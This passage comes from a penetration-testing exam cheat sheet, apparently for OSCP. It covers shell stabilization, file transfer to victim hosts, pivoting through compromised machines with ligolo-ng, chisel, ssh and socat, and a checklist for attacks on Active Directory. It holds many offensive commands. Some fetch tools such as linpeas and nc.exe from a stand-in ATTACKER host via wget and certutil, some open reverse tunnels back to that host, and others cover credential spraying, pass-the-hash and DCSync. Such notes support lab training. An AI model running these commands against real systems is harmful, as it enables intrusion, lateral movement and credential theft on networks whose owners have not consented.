python3 -c 'import pty;pty.spawn("/bin/bash")'
```
Set the terminal type:
```bash
export TERM=xterm
```
Background with **Ctrl-Z**, then hand terminal settings over and foreground it:
```bash
stty raw -echo; fg
```

> [!note]
> - Order matters: PTY → `TERM` → `stty raw -echo; fg` (press Enter twice after). Now Ctrl-C, arrows, and tab-complete work.
> - Faster alternative: wrap the listener with `rlwrap nc -lvnp 443` up front.
> - `stty size` in your *real* terminal shows rows/cols — set them in the shell (`stty rows 50 cols 200`) so `less`/`vim` render correctly.
> - On Windows, `evil-winrm` is already interactive — no stabilization needed.

## 11.1 — File transfer — *which method when*

Pick by the victim's OS and egress. This is a decision table — read the left column, use the right.

| Situation (architecture) | Command |
|---|---|
| **Linux victim, HTTP egress allowed** | Kali `python3 -m http.server 80` → victim `wget http://ATTACKER/linpeas.sh` |
| **Windows victim, HTTP egress** | `certutil -urlcache -f http://ATTACKER/nc.exe nc.exe` |
| **Windows (PowerShell)** | `iwr -uri http://ATTACKER/f.exe -o f.exe` |
| **Egress-filtered, but SMB reachable** | Kali `impacket-smbserver share . -smb2support` → victim `copy \\ATTACKER\share\f.exe .` |
| **Have SSH creds** | `scp file user@$IP:/tmp/` |
| **Tiny file / no tools at all** | base64 the file, echo-paste, `base64 -d` on the other side |

> [!tip]
> The decision hinges on egress — if the victim can reach *out* over HTTP, the http.server route is simplest. If HTTP is filtered but SMB isn't, switch to the impacket SMB server rather than burning 20 minutes debugging `wget`. **Try in order:** `wget` → `curl` → `certutil` → `impacket-smbserver` → base64 copy-paste.

**Where to drop files (writable/executable dirs):**
```
# Linux
/tmp            # almost always writable; sometimes noexec — test it
/dev/shm        # writable, usually executable when /tmp is noexec
/var/tmp        # persistent writable alternative
/home/<user>    # your own home

# Windows
C:\Windows\Temp          # writable by most users, often overlooked
C:\Users\Public          # world-writable, survives across users
C:\ProgramData           # writable, hidden by default
%TEMP% / %APPDATA%       # per-user, reliable
```

> [!note]
> If `/tmp` is mounted `noexec` (check `mount | grep tmp`), your binary won't run there → use `/dev/shm`. On Windows, `C:\Windows\Temp` and `C:\Users\Public` are the two writable by low-priv users on the vast majority of boxes.

## 11.2 — Port forwarding & tunneling — *when to use which*

**The core decision:** you pivot when a compromised host can reach a network/host **that your Kali cannot.** The exam's canonical architecture:

```
Kali (tun0, 192.168.45.x)
   │  can reach
   ▼
[ Foothold A ]  eth0 10.10.10.5   (Kali-reachable)
                eth1 172.16.5.5   (internal-only, second NIC)
   │  can reach
   ▼
[ Box B: 172.16.5.10  (DC) ]      <-- Kali CANNOT reach directly
[ Box C: 172.16.5.11 ]            <-- only reachable THROUGH A
```

**How you know it's time to pivot:** on the foothold, `ip a`/`ipconfig` shows a second interface on a new subnet (`172.16.5.x`), or `arp -a` lists hosts your Kali can't ping. Everything below is about giving your Kali tools a path to `172.16.5.0/24` *through* A.

> [!tip] Quick chooser — pick by what you already have on the pivot
> - **SSH creds on A (Linux)?** → `sshuttle` (route, simplest) or `ssh -D` (SOCKS) or `ssh -L` (one port). Nothing to upload.
> - **Only a shell, but can run a binary?** → **ligolo-ng** (real route, all tools/scan types work). Best default.
> - **Only a shell, want a quick SOCKS proxy?** → **chisel** reverse SOCKS.
> - **Need to PUSH a port *inward* (a host that can't reach Kali)?** → `ssh -R` or chisel reverse forward.
> - **Just one port from one host, minimal tooling?** → `ssh -L`, chisel single-port, or `socat` relay.

### ligolo-ng — tun route (preferred default)

**Architecture / when:** you have a shell on A and can drop+run the agent. Gives Kali a real route into `172.16.5.0/24`, so `172.16.5.10` is reachable *directly* — full nmap scan types, every tool unmodified, and clean double-pivots.

```
Kali ──[ligolo tun]──> A (agent) ──> 172.16.5.0/24
route: 172.16.5.0/24 dev ligolo
target you reach: 172.16.5.10 directly (nmap -sS, evil-winrm, CME all work)
```

Set up the interface on Kali:
```bash
sudo ip tuntap add user $USER mode tun ligolo; sudo ip link set ligolo up
```
Start the proxy on Kali:
```bash
./proxy -selfcert
```
Run the agent on the pivot (A):
```bash
./agent -connect ATTACKER:11601 -ignore-cert
```
Add the route on Kali (after `session` → select agent → `start` in the ligolo console):
```bash
sudo ip route add 172.16.5.0/24 dev ligolo
```

> [!note]
> Double-pivot (A → B → `172.16.6.0/24`): run a second agent on B, `start` its session, and add a route for the deeper subnet the same way. This is where ligolo shines over SOCKS chaining. To reach your Kali listener *from* an internal host, use ligolo's `listener_add` to bind a port on the agent that forwards back to Kali (the reverse-shell-catch problem).

### chisel — reverse SOCKS proxy (workhorse when no SSH/agent)

**Architecture / when:** shell on A, no SSH creds, and you're fine driving tools through proxychains. You get a SOCKS proxy on Kali:1080 rather than a route.

```
Kali (proxychains → SOCKS 127.0.0.1:1080) ──> chisel ──> A ──> 172.16.5.0/24
target you reach: 172.16.5.10 via  proxychains <tool>   (must use nmap -sT -Pn)
```

On Kali (server):
```bash
./chisel server -p 8000 --reverse
```
On the pivot A (connects back, opens SOCKS on Kali:1080):
```bash
./chisel client ATTACKER:8000 R:socks
```
Drive a tool through it (proxychains set to `socks5 127.0.0.1 1080`, [§10.4](#104--setup-proxychains--reusable-listeners)):
```bash
proxychains crackmapexec smb 172.16.5.0/24
```

> [!note]
> Over SOCKS you must use TCP-connect nmap (`nmap -sT -Pn`) — SYN scans don't traverse a proxy. For just one internal service, skip SOCKS and forward a single port: `./chisel client ATTACKER:8000 R:3389:172.16.5.10:3389`, then hit `127.0.0.1:3389`.

### ssh -D — dynamic SOCKS (when you have SSH creds)

**Architecture / when:** A is Linux and you have SSH creds. Same SOCKS outcome as chisel but nothing to upload — fastest to stand up.

```
Kali (proxychains → SOCKS 1080) ──[ssh]──> A ──> 172.16.5.0/24
target you reach: whole 172.16.5.0/24 via proxychains
```

```bash
ssh -D 1080 user@$IP
```

### ssh -L — local forward (one specific internal service)

**Architecture / when:** you have SSH creds and only need *one* internal service on Kali (an internal web app, RDP). *"Bring that port to me."*

```
Kali:8080 ──[ssh to A]──> 172.16.5.10:80
target you reach: browse http://127.0.0.1:8080  == internal web on B
```

```bash
ssh -L 8080:172.16.5.10:80 user@$IP
```

### ssh -R — remote forward (push a port INWARD)

**Architecture / when:** an internal host (or A itself) needs to reach a service on *your* Kali but can't route to you — e.g. catching a reverse shell from B which can only see A, or serving a payload inbound. *"Push my port onto their network."*

```
B (172.16.5.10) ──> A:443 ──[ssh back]──> Kali:443
use: B connects to A:443, which tunnels to your Kali listener on 443
```

```bash
ssh -R 443:127.0.0.1:443 user@$IP
```

### sshuttle — transparent VPN-like (SSH creds, no proxychains)

**Architecture / when:** SSH creds on a Linux pivot and you want route-like behavior without wrapping every command in proxychains. Simplest "just make the subnet reachable" option when ligolo isn't available.

```
Kali ──[sshuttle]──> A ──> 172.16.5.0/24   (routed transparently)
target you reach: 172.16.5.10 directly, tools unmodified (TCP only)
```

```bash
sshuttle -r user@$IP 172.16.5.0/24
```

### socat — single-port relay (last resort, no SSH/agent)

**Architecture / when:** minimal foothold on A where you can run `socat` but not chisel/ligolo, and you need one port from one internal host.

```
Kali ──> A:8080 ──[socat]──> 172.16.5.10:80
```

On the pivot A:
```bash
socat TCP-LISTEN:8080,fork TCP:172.16.5.10:80
```

> [!warning] Exam constraint
> **Metasploit cannot be used to pivot** ([§0.1](#01--tool-restrictions--read-this-it-cost-you-before)) — pivoting touches a second host. Use ligolo/chisel/SSH/socat for all tunneling; keep MSF (if you use it at all) to your one chosen target. **Try in order:** ligolo-ng → chisel → `ssh -D` → `sshuttle` → `socat`.

## 11.3 — Quick networking troubleshooting

When something "can't connect," check these before assuming the exploit is wrong.

```bash
ip a ; ip route
```
```bash
nc -zv <host> <port>
```
```bash
arp -a
```

> [!note]
> `ip a`/`ip route` answer "what can I reach and which interface is the pivot on." `nc -zv` is a fast port-reachability check. `arp -a` on the pivot reveals neighbor hosts your Kali can't ping — often your next targets. If DNS breaks over a tunnel, point tools at the DC's IP directly instead of a hostname.

---

# A — Condensed Master Checklist (print this)

**Per target:**
- [ ] `nmap -p-` full TCP → deep `-sCV -O` on open ports → `--script vuln` → `-sU` top UDP
- [ ] Every port identified to service+version (searchsploit each)
- [ ] Web: whatweb → nikto → feroxbuster (correct ext) → vhosts to /etc/hosts → login/upload noted
- [ ] SMB/FTP/NFS: null/anon → list shares → **re-run authenticated once you have creds** → loot sensitive files ([§2.4](#24--file--share-enumeration) table)
- [ ] SNMP (161/udp) community strings if UDP open
- [ ] **Every found cred sprayed across ALL hosts/protocols (CME `--continue-on-success`)**
- [ ] Foothold → **stabilize shell** → `local.txt` + screenshot (flag + IP) → **submit in control panel**
- [ ] Linux: `sudo -l`, SUID, caps, cron, group memberships, creds → linpeas
- [ ] Windows: **`whoami /priv`** (Potato? SeBackup? SeDebug?), services (perms/unquoted/DLL), scheduled tasks, AlwaysInstallElevated, creds → winpeas
- [ ] Root/SYSTEM → **`proof.txt` + screenshot (flag + IP)** → **submit in control panel**

**AD set (all 3 = one chain):**
- [ ] kerbrute userenum → given creds → BloodHound collection + **mark owned**
- [ ] AS-REP roast (no-preauth) + Kerberoast (SPNs) → hashcat
- [ ] Check `--pass-pol` → spray creds ; abuse ACL edges from BloodHound (rights decoder §7.1)
- [ ] Lateral: PtH via wmiexec/psexec/evil-winrm to admin-to hosts
- [ ] secretsdump each host → hunt cached DA → DCSync / shadow-copy NTDS with DA → Administrator hash
- [ ] PtH into DC → `proof.txt` + screenshot → submit

**Pivot:**
- [ ] Foothold dual-homed? (`ip a`/`ipconfig`, arp) → ligolo/chisel → route into hidden subnet → recurse [§1](#1--methodology-master-decision-flow)
- [ ] Remember: **no Metasploit pivoting**

**Discipline (the stuff that lost points before):**
- [ ] Stalled 30–45 min? Rotate. Note the parked vector.
- [ ] Tried the *simple* path (default creds, file, known CVE) before the clever one?
- [ ] Privesc: ran the enum script **AND** the manual quick-wins — didn't skip the boring enumeration
- [ ] AD: sprayed the given creds **and** roasted before anything clever
- [ ] **All flags submitted in control panel before the clock ends**
- [ ] Every flag screenshot has the IP in-frame, read from original location, interactive shell
- [ ] sqlmap/Burp-Pro/AI/Responder-poisoning untouched ; MSF used on ≤1 target
- [ ] 2h report buffer preserved ; report → PDF → password-less .7z → upload.offsec.com → verify MD5 → Submit File

> [!tip] The one-line reminder that would have changed last attempt
> **Enumerate as the new user, every time. Spray every credential, everywhere. Run privesc as a ritual, not a menu.** The boring path is the intended path.
